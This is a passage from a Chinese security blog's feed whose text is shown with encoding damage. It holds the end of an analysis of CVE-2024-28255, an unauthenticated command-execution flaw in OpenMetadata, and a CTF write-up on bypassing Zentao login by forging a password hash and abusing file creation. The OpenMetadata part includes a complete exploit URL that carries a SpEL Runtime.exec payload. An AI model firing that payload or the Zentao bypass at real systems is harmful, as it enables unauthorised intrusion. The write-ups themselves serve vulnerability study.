<code>org.glassfish.jersey.server.internal.routing.MatchResultInitializerRouter#apply</code> æ–¹æ³•ï¼Œè¿™é‡Œçš„å¤„ç†éå¸¸ç„å¦™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rc.pushMatchResult(<span class="keyword">new</span> <span class="title class_">SingleMatchResult</span>(<span class="string">&quot;/&quot;</span> + processingContext.request().getPath(<span class="literal">false</span>)));</span><br></pre></td></tr></table></figure><p>å…ˆæ¥çœ‹ getPath çš„ç»“æœ</p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getPath.png" class><p>æ¥ç€è·Ÿè¿› <code>SingleMatchResult</code> æ„é€ å‡½æ•°çœ‹æ˜¯æ€ä¹ˆå¤„ç†çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SingleMatchResult</span><span class="params">(String path)</span> &#123;  </span><br><span class="line">    <span class="built_in">this</span>.path = stripMatrixParams(path);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿› stripMatrixParams() æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">stripMatrixParams</span><span class="params">(String path)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">e</span> <span class="operator">=</span> path.indexOf(<span class="number">59</span>);  </span><br><span class="line">    <span class="keyword">if</span> (e == -<span class="number">1</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> path;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">do</span> &#123;  </span><br><span class="line">            sb.append(path, s, e);  </span><br><span class="line">            s = path.indexOf(<span class="number">47</span>, e + <span class="number">1</span>);  </span><br><span class="line">            <span class="keyword">if</span> (s == -<span class="number">1</span>) &#123;  </span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            e = path.indexOf(<span class="number">59</span>, s);  </span><br><span class="line">        &#125; <span class="keyword">while</span>(e != -<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (s != -<span class="number">1</span>) &#123;  </span><br><span class="line">            sb.append(path, s, path.length());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> sb.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆæå–ç¬¬ä¸€æ¬¡å‡ºç° <code>;</code> çš„åœ°æ–¹ï¼Œæå–å®Œæ¯•ä¹‹åï¼Œæ‹¿åˆ° result1 å­—ç¬¦ä¸²ï¼Œå†å»å®šä½ result1 å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ª <code>/</code>ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ç›´æ¥ breakã€‚å¦åˆ™ä»ç¬¬ä¸€ä¸ª <code>/</code> å‡ºç°çš„åœ°æ–¹ï¼Œå¼€å§‹æ‰¾ç¬¬ä¸€æ¬¡å‡ºç° <code>;</code> çš„åœ°æ–¹ã€‚å¦‚æœæ²¡æœ‰äº†ï¼Œåˆ™è·³å‡ºå¾ªç¯ï¼Œå¦‚æœæœ‰åˆ™ç»§ç»­å¤„ç†ã€‚åœ¨æˆ‘ä»¬ç²¾å¿ƒæ„é€ è¿‡ä¹‹åçš„ payloadï¼Œå¾—åˆ°çš„ç»“æœå°±é¡ºç†æˆç« å˜æˆäº† <code>/v1/events/subscriptions/validation/condition/xxx</code></p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/final.png" class><p>ä»ä¸Šé¢å¼€å§‹ï¼Œæ‹¿åˆ°äº†æ ¸å¿ƒè·¯ç”±éå¸¸å…³é”®ã€‚éšåçš„è¯­å¥æŠŠè·¯ç”±è¡¨å’Œæˆ‘ä»¬å¤„ç†ä¹‹åçš„æ ¸å¿ƒè·¯ç”±è¿›è¡Œæ¯”è¾ƒï¼Œæ‹¿åˆ°ä¸€ä¸ªæ–°çš„è·¯ç”±è¡¨ï¼ˆå‰é¢å…¶å®å°±æ‹¿åˆ°ä¸€ä¸ªè·¯ç”±è¡¨äº†ï¼‰</p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/continuationRouter.png" class><p>å›åˆ° <code>org.glassfish.jersey.server.internal.routing.RoutingStage#_appy</code> æ–¹æ³•ï¼Œè¿›å…¥åˆ°è¿­ä»£å™¨äº†ã€‚è¿­ä»£å™¨é‡Œé¢ä¼šå–å‡ºæ‰€æœ‰è·¯ç”±ï¼Œæ ¹æ®åŒ¹é…è§„åˆ™è¿›è¡Œä¼˜å…ˆåŒ¹é…ï¼Œæ¥ç€æå–å‡º endpoint</p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/endpoint.png" class><p>è·Ÿè¿› <code>Routers.extractEndpoint(router)</code> æ¥çœ‹å…·ä½“çš„è·¯ç”±å¤„ç†ã€‚router å°±æ˜¯è¢«è¯·æ±‚çš„èµ„æºæ¥å£ï¼Œåˆ¤æ–­å½“å‰èµ„æºæ¥å£æ˜¯å¦ç¡®è®¤ä¸ºæ¥å£ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œè¿”å›æ¥å£æ‰€æœ‰ä¿¡æ¯ï¼Œæœ€ç»ˆå¾—åˆ°çš„æ¥å£å¦‚å›¾</p><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/EventResource.png" class><p>éå¸¸æ¸…æ™°ï¼Œéå¸¸æœ‰è¶£ã€‚æœ€ç»ˆæ‹¿åˆ°çš„è¿™ä¸ª endpoint æ‰æ˜¯çœŸæ­£çš„è·¯ç”±èµ„æºã€‚è€Œåœ¨è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œç”±äº filter è¿˜æ˜¯ä»…ä»…å¤„ç†èµ„æºè¯·æ±‚ï¼Œæ‰€ä»¥äº§ç”Ÿäº†è¿™ä¸ªæ¼æ´ï¼ŒåŒç†å…¶å®è‡ªå·±ä¹Ÿå¯ä»¥æ„é€ ç±»ä¼¼çš„ payloadï¼Œåœ¨æœ¬æ–‡ä¸­å°±ä¸åˆ—ä¸¾äº†ã€‚</p><h2 id="0x04-æ¼æ´å¤ç°"><a href="#0x04-æ¼æ´å¤ç°" class="headerlink" title="0x04 æ¼æ´å¤ç°"></a>0x04 æ¼æ´å¤ç°</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8585/api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/%54%28%6a%61%76%61.%6c%61%6e%67.%52%75%6e%74%69%6d%65%29.%67%65%74%52%75%6e%74%69%6d%65%28%29.%65%78%65%63%28%6e%65%77%20%6a%61%76%61.%6c%61%6e%67.%53%74%72%69%6e%67%28%54%28%6a%61%76%61.%75%74%69%6c.%42%61%73%65%36%34%29.%67%65%74%44%65%63%6f%64%65%72%28%29.%64%65%63%6f%64%65%28%22%64%47%39%31%59%32%67%67%4c%33%52%74%63%43%39%77%64%32%35%6c%5a%41%3d%3d%22%29%29%29</span><br></pre></td></tr></table></figure><img src="/2024/04/26/CVE-2024-28255-OpenMetaData-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/rce.png" class><h2 id="0x05-Ref"><a href="#0x05-Ref" class="headerlink" title="0x05 Ref"></a>0x05 Ref</h2><p><a class="link" href="https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata/">https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2024-28255 æ¼æ´åˆ†æ</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘ 2024 ezERP å‡ºé¢˜è®°å½•</title>
    <link href="https://drun1baby.github.io/2024/02/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2024-ezERP-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://drun1baby.github.io/2024/02/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2024-ezERP-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2024-02-10T12:11:02.000Z</published>
    <updated>2024-02-10T12:11:31.119Z</updated>
    
    <content type="html"><![CDATA[<p>å’•å’•å’•äº†</p>]]></content>
    
    
    <summary type="html">è¥¿æ¹–è®ºå‰‘ 2024 ezERP å‡ºé¢˜è®°å½•</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>å¼ºç½‘æ¯ s7 å†³èµ› Zent WP</title>
    <link href="https://drun1baby.github.io/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/"/>
    <id>https://drun1baby.github.io/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/</id>
    <published>2024-01-15T01:56:07.000Z</published>
    <updated>2024-02-01T13:04:09.111Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ªèœäº†ï¼Œæœ€åè¿˜æ˜¯å·®ä¸€ç‚¹ï¼Œå‘ç°é¢˜ç›®å‰å°å’Œæˆ‘ä»¬æƒ³è±¡ä¸­çš„ä¸ä¸€æ ·ï¼Œåå°å·²ç» RCE äº†ï¼Œä½†æ˜¯å‰å°æ²¡è¿‡ï¼Œä¸Šå°ç›´æ¥æ±—æµæµƒèƒŒäº†</p><h2 id="å‰å°é‰´æƒç»•è¿‡"><a href="#å‰å°é‰´æƒç»•è¿‡" class="headerlink" title="å‰å°é‰´æƒç»•è¿‡"></a>å‰å°é‰´æƒç»•è¿‡</h2><p>å…ˆæ¥çœ‹ä¸€ä¸‹é¢˜ç›®ç»™çš„ deploy</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2. é¢˜ç›®ä»…åšè¿‡å¦‚ä¸‹æ”¹åŠ¨</span><br><span class="line"></span><br><span class="line">/opt/zbox/bin/mysql -u root -P 3306 -p123456 -e &quot;drop database zentaoep;drop database zentaomax;&quot;</span><br><span class="line">/opt/zbox/bin/mysql -u root -P 3306 -p123456 -e &quot;use zentao;update zt_user SET password=&#x27;123abc&#x27; where account =&#x27;admin&#x27;;&quot;</span><br><span class="line">rm -rf /opt/zbox/app/zentaoep &amp;&amp; rm -rf /opt/zbox/app/zentaomax &amp;&amp; rm -rf /opt/zbox/app/adminer &amp;&amp; rm -rf /opt/zbox/bin/htpasswd</span><br><span class="line"></span><br><span class="line">3.é¢˜ç›®éƒ¨ç½²æ–¹æ³•ï¼ˆå±•å°é‡‡ç”¨åŒæ ·æ–¹å¼éƒ¨ç½²ï¼‰</span><br><span class="line"></span><br><span class="line">docker load -i zentao.tar</span><br><span class="line">docker run -dit  --name=zentao -p 30021:80  ctf2:latest</span><br><span class="line">docker exec -it zentao /opt/zbox/zbox restart</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å°†ç¯å¢ƒèµ·äº†ä¹‹åï¼Œä¼šå‘ç°ç”¨ admin&#x2F;123abc æ˜¯æ²¡åŠæ³•ç™»å½•è¿›å»çš„</p><p>æŠ“åŒ…ä¹‹åçš„é€»è¾‘æ˜¯åœ¨ <code>/module/user</code> ä¸‹çš„ controlï¼Œlogin æ–¹æ³•ï¼Œè¿™é‡Œæ˜¯ zentao çš„è·¯ç”±å¤„ç†ã€‚</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/identify.png" class><p>è·Ÿè¿›ä¸€ä¸‹ <code>identify()</code> å‡½æ•°ï¼Œçœ‹ä¸€æ®µä»£ç å°±èƒ½çœ‹åˆ°æœ€æ ¸å¿ƒçš„é‰´æƒéƒ¨åˆ†äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">identify</span>(<span class="params"><span class="variable">$account</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$account</span> <span class="keyword">or</span> !<span class="variable">$password</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">/* Check account rule in login.  */</span></span><br><span class="line">        <span class="keyword">if</span>(!validater::<span class="title function_ invoke__">checkAccount</span>(<span class="variable">$account</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Get the user first. If $password length is 32, don&#x27;t add the password condition.  */</span></span><br><span class="line">        <span class="variable">$record</span> = <span class="variable language_">$this</span>-&gt;dao-&gt;<span class="title function_ invoke__">select</span>(<span class="string">&#x27;*&#x27;</span>)-&gt;<span class="keyword">from</span>(TABLE_USER)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;account&#x27;</span>)-&gt;<span class="title function_ invoke__">eq</span>(<span class="variable">$account</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">beginIF</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">32</span>)-&gt;<span class="title function_ invoke__">andWhere</span>(<span class="string">&#x27;password&#x27;</span>)-&gt;<span class="title function_ invoke__">eq</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))-&gt;<span class="title function_ invoke__">fi</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">andWhere</span>(<span class="string">&#x27;deleted&#x27;</span>)-&gt;<span class="title function_ invoke__">eq</span>(<span class="number">0</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If the length of $password is 32 or 40, checking by the auth hash. */</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If the length of $password is 32 or 40, checking by the auth hash. */</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$record</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$passwordLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$passwordLength</span> &lt; <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$record</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(<span class="variable">$passwordLength</span> == <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hash</span> = <span class="variable language_">$this</span>-&gt;session-&gt;rand ? <span class="title function_ invoke__">md5</span>(<span class="variable">$record</span>-&gt;password . <span class="variable">$this</span>-&gt;session-&gt;rand) : <span class="variable">$record</span>-&gt;password;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$password</span> == <span class="variable">$hash</span> ? <span class="variable">$record</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(<span class="variable">$passwordLength</span> == <span class="number">40</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hash</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$record</span>-&gt;account . <span class="variable">$record</span>-&gt;password . <span class="variable">$record</span>-&gt;last);</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$password</span> == <span class="variable">$hash</span> ? <span class="variable">$record</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$user</span> <span class="keyword">and</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) == <span class="variable">$record</span>-&gt;password) <span class="variable">$user</span> = <span class="variable">$record</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¿™é‡Œçš„åˆ¤æ–­æ˜¯æœ‰é—®é¢˜çš„ï¼ŒæŒ‰ç…§æ­£å¸¸çš„é€»è¾‘æ¥è¯´ï¼Œå¯†ç åº”è¯¥æ˜¯ä»æ•°æ®åº“é‡Œé¢å»å–ï¼Œå»æ¯”å¯¹çš„ï¼Œä½†æ˜¯ï¼Œå½“ <code>($passwordLength == 32)</code> æ—¶ï¼Œæ˜¯è®©ä¸€ä¸ª hash å’Œå¯†ç è¿›è¡Œæ¯”å¯¹ï¼ŒæŠŠè¿™éƒ¨åˆ†ä»£ç æå–å‡ºæ¥ï¼Œçœ‹ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$passwordLength</span> == <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hash</span> = <span class="variable language_">$this</span>-&gt;session-&gt;rand ? <span class="title function_ invoke__">md5</span>(<span class="variable">$record</span>-&gt;password . <span class="variable">$this</span>-&gt;session-&gt;rand) : <span class="variable">$record</span>-&gt;password;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$password</span> == <span class="variable">$hash</span> ? <span class="variable">$record</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>è§£è¯»ä¸€ä¸‹åˆ¤æ–­é€»è¾‘ï¼š</p><p>å¦‚æœ session é‡Œé¢å­˜åœ¨ rand å­—æ®µï¼Œå¦‚æœå­˜åœ¨åˆ™æŠŠ password ä¸ rand è¿›è¡Œæ‹¼æ¥ï¼Œå† md5 ä¸€ä¸‹ï¼Œå¾—åˆ° hashã€‚<br>å¦‚æœ session é‡Œé¢ä¸å­˜åœ¨ rand å­—æ®µï¼Œåˆ™ç›´æ¥æŠŠ passsword çš„å€¼èµ‹ç»™ hashã€‚</p><p>éšåæ¯”è¾ƒ password å’Œ hash æ˜¯å¦ç›¸åŒã€‚</p><p><code>$record-&gt;password</code> æ˜¯æˆ‘ä»¬å·²çŸ¥çš„ï¼Œä¸º 123abcï¼Œç›®å‰å…¶å®åªéœ€è¦çŸ¥é“ rand æ˜¯ä»€ä¹ˆï¼Œå°±å¯ä»¥<strong>ä¼ªé€  hash</strong> äº†ï¼Œä»è€Œ<strong>ç»•è¿‡é‰´æƒ</strong>ã€‚</p><p>æŠ“åŒ…çœ‹ä¸€ä¸‹ä¼ å‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">account=admin&amp;password=fe87780190a502d7eb5f743907918ee4&amp;passwordStrength=0&amp;referer=&amp;verifyRand=1871116681&amp;keepLogin=0&amp;captcha=</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ä¸€ä¸ªå‚æ•°ä¸º <strong>verifyRand</strong>ï¼Œå¯¹åº”ä»£ç é‡Œé¢çš„å˜é‡æ˜¯ <code>$rand</code> çœ‹ä¸€ä¸‹æ˜¯æ€ä¹ˆæ¥çš„</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/rand.png" class><p>å¾ˆæ˜æ˜¾ï¼Œå¯¹åº”çš„å‡½æ•°æ˜¯ refreshRandomï¼Œæ‰€ä»¥å‰ç«¯å‘èµ·è¯·æ±‚åªéœ€è¦é€šè¿‡ <code>user-refreshRandom.html</code> å³å¯ï¼Œè¿™é‡Œå†è·Ÿè¿› updateSessionRandom å‡½æ•°</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/random.png" class><p>éšæœºæ•°ï¼Œä¸å¤šè®²äº†ï¼Œèµ‹å€¼ã€‚</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/getRandom.png" class><p>å¤ªç®€å•äº†ï¼Œä½†å‡¡æ¯”èµ›çš„æ—¶å€™çœ‹ä¸€ç‚¹éƒ½èƒ½å‡ºã€‚</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/success.png" class><p>è¿›äº†ä¹‹åä¼šè®©æˆ‘é‡æ–°ä¿®æ”¹å¯†ç ï¼Œé‡æ–°ä¿®æ”¹å¯†ç è¿™é‡Œä¹Ÿéœ€è¦æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤å†æ¥ä¸€éï¼Œå†æäº¤å¯†ç </p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/reset.png" class><h2 id="åå°-RCE"><a href="#åå°-RCE" class="headerlink" title="åå° RCE"></a>åå° RCE</h2><p>æœ‰ç‚¹éªšï¼Œä¸€å¼€å§‹ä¸€ç›´åœ¨æ‰¾ patch å’Œ diffï¼Œæ²¡æƒ³åˆ°æœ€æ–°ç‰ˆä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜</p><p>æœ€å¤§çš„é—®é¢˜æ˜¯æœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶åˆ›å»ºçš„æ¼æ´ï¼Œå¯¹åº”æ¥å£ <code>upgrade-moveExtFiles-1.html</code></p><p>æ¥çœ‹ä¸€ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveExtFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span>       = fixer::<span class="title function_ invoke__">input</span>(<span class="string">&#x27;post&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>();</span><br><span class="line">        <span class="variable">$customRoot</span> = <span class="variable language_">$this</span>-&gt;app-&gt;appRoot . <span class="string">&#x27;extension&#x27;</span> . DS . <span class="string">&#x27;custom&#x27;</span>;</span><br><span class="line">        <span class="variable">$response</span>   = <span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$data</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$dirRoot</span>  = <span class="variable">$customRoot</span> . DS . <span class="title function_ invoke__">dirname</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$fileName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$fromPath</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getModuleRoot</span>() . <span class="variable">$file</span>;</span><br><span class="line">            <span class="variable">$toPath</span>   = <span class="variable">$dirRoot</span> . DS . <span class="variable">$fileName</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dirRoot</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dirRoot</span>, <span class="number">0777</span>, <span class="literal">true</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$response</span>[<span class="string">&#x27;result&#x27;</span>]  = <span class="string">&#x27;fail&#x27;</span>;</span><br><span class="line">                    <span class="variable">$response</span>[<span class="string">&#x27;command&#x27;</span>] = <span class="string">&#x27;chmod o=rwx -R &#x27;</span>. <span class="variable language_">$this</span>-&gt;app-&gt;appRoot . <span class="string">&#x27;extension/custom&#x27;</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">copy</span>(<span class="variable">$fromPath</span>, <span class="variable">$toPath</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">replaceIncludePath</span>(<span class="variable">$toPath</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é‡Œé¢å­˜åœ¨â€œå±é™©â€çš„å‡½æ•°æ˜¯ mkdirï¼Œå…¶å®æœ¬èº«è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œåªæ˜¯ç”¨åœ¨ç»„åˆåˆ©ç”¨ä¸Šé¢å°±æˆäº†å±é™©å‡½æ•°ã€‚</p><p>æ¼æ´åˆ©ç”¨ä¹Ÿéå¸¸æ˜ç¡®ï¼Œå€¼å¾—ä¸€æçš„æ˜¯æœ¬èº«çš„è¯·æ±‚æ˜¯ <code>upgrade-moveExtFiles.html</code>ï¼Œç”±äºéœ€è¦ä¼ ä¸€ä¸ª version 